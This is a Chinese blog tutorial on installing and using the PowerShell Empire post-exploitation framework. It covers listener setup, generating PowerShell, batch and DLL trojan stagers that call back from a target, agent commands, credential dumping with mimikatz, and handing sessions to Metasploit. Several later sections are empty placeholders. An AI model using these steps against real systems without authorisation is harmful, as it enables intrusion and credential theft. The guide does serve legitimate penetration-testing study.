**目录**

[Empire](#t0 "Empire")

[Empire的安装](#t1 "Empire的安装")

[Empire的使用](#t2 "Empire的使用 ") 

[建立监听](#t3 "建立监听")

[生成木马](#t4 "生成木马")

[上线后的操作](#t5 "上线后的操作")

[派生MSF](#t6 "派生MSF")

[信息收集](#t7 "信息收集")

[权限提升](#t8 "权限提升")

[横向渗透](#t9 "横向渗透")

[后门](#t10 "后门")

* * *

Empire
======

    Empire一款基于[PowerShell](https://so.csdn.net/so/search?q=PowerShell&spm=1001.2101.3001.7020)的后渗透测试工具，它具有从stager生成，提权到渗透维持的一系列的功能。Empire实现了无需powershell.exe 便可运行PowerShell代理的功能，还可以快速在后期部署漏洞利用模块。其内置模块有键盘记录、mimikatz、绕过UAC、内网扫描等，并且能够躲避网络监测和大部分安全防护工具的查杀。它有点类似于Metasploit，是一个基于PowerShell的远控木马。官网：[PowerShell Empire | Building an Empire with PowerShell](http://www.powershellempire.com/ "PowerShell Empire | Building an Empire with PowerShell")  ，项目地址：[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire "https://github.com/EmpireProject/Empire")

Empire的安装
---------

Empire不能安装在Redhat系列的主机上，所以建议安装在Debian系列的Linux上。如Kali、Ubuntu。

```
git clone https://github.com/EmpireProject/Empire.git      
cd setup      
./install.sh      
进入Empire目录，./empire 打开Empire      
输入help查看帮助
```


![](https://img-blog.csdnimg.cn/20191119220728850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

启动empire：./empire  可以看到有285个module

![](https://img-blog.csdnimg.cn/2019121714005675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**Docker中安装**

```
#拉取empire的镜像      
docker pull bcsecurity/empire       
#直接把宿主机的网络映射给容器      
docker run -it --rm  --network=host bcsecurity/empire
```


![](https://img-blog.csdnimg.cn/2020071822122629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200718221242994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Empire的使用 
----------

Empire的使用和MSF非常类似。需要先建立一个 listeners，然后生成 [木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)，在目标机执行，我们的listeners就可以收到目标机返回的session了。

首先输入 help 查看帮助

![](https://img-blog.csdnimg.cn/20191217135620991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 建立监听

输入 listeners 进入[监听](https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC&spm=1001.2101.3001.7020)界面，然后输入 uselistener 双击table会弹出可供选择的监听器，这里有9个监听器

1.  dbx
2.  http\_com
3.  http\_hop
4.  meterpreter
5.  redirector
6.  http
7.  http\_foreign
8.  http\_mapi
9.  onedrive

![](https://img-blog.csdnimg.cn/20191217140946818.png)

*   我们这里使用 http 监听器： uselistener http
*   然后输入：info  查看该监听器需要配置的参数

![](https://img-blog.csdnimg.cn/20200718232835681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   然后设置各参数（主要设置Name、Host和Port，注意这里大小写区分）
*   设置监听的名字：set Name http
*   设置目标主机：set Host http://192.168.10.13:8888
*   设置端口：set Port 8888
*   执行，生成监听：execute

![](https://img-blog.csdnimg.cn/20200718233423821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   退回上一层界面：back
*   可以查看当前激活的监听：list 
*   删除该监听：kill name 

注：不同的监听需要不同的名字，并且监听的端口号也要不同

### 生成木马

设置完监听后，我们就需要生成木马了，然后让该木马在目标机器运行，这样我们的监听就能接收到目标机器反弹回来的shell了。

输入：usestager 然后双击table就能显示所有的stager，这里一共有31个stager

multi为通用模块，osx是Mac系统的模块，windows是 windows 系统的模块

![](https://img-blog.csdnimg.cn/2019121714210415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**powershell反弹命令**

如果需要生成反弹powershell的命令，在设置完监听器后，输入 launcher  powershell  监听器名字  来生成powershell代码。

![](https://img-blog.csdnimg.cn/20200718233648681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后复制生成的powershell代码去目标机执行即可。

**生成bat脚本**

如果想生成bat脚本，可以输入：usestager windows/launcher\_bat test       test是监听器的名字。生成后，会在tmp目录下生成launcher.bat脚本。将该脚本在目标机器运行即可。

![](https://img-blog.csdnimg.cn/20200718234455198.png)

**DLL木马**

*   使用dll木马：usestager  windows/dll  
*   查看参数：info

![](https://img-blog.csdnimg.cn/20191217142824618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   设置监听器：set Listener mererpreter
*   执行：execute

然后就会在tmp目录下生成launcher.dll的木马，只要launcher.dll在目标机器运行后，我们的监听器就能接受到shell

![](https://img-blog.csdnimg.cn/20191217150116496.png)

### 上线后的操作

```
#查看在线的机器，红色的是曾经上线但是现在掉线的机器，绿色的是目前在线的机器      
agents      
#重命名名字      
rename name1 name2      
#进入某个机器里面      
interact name      
#执行操作系统命令      
shell 命令
```


![](https://img-blog.csdnimg.cn/20200718231510280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果想使用其他后渗透模块，可以执行 usemodule 然后table键，可以查看所有的模块。

![](https://img-blog.csdnimg.cn/20200718235323389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 获取密码

如果是administrator权限，可以直接执行 mimikatz 命令获取账号密码

![](https://img-blog.csdnimg.cn/20200718235015195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200718235101431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 派生MSF

将empire获得的shell派生给msf，使用的是 code\_execution/invoke\_shellcode 模块

![](https://img-blog.csdnimg.cn/20200718235611677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 信息收集

### 权限提升

### 横向渗透

### 后门

未完待续。。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[内网工具学习之Empire后渗透](http://www.52bug.cn/hkjs/5194.html "内网工具学习之Empire后渗透")

                  [empire用法笔记](https://blog.csdn.net/fageweiketang/article/details/88020020 "empire用法笔记")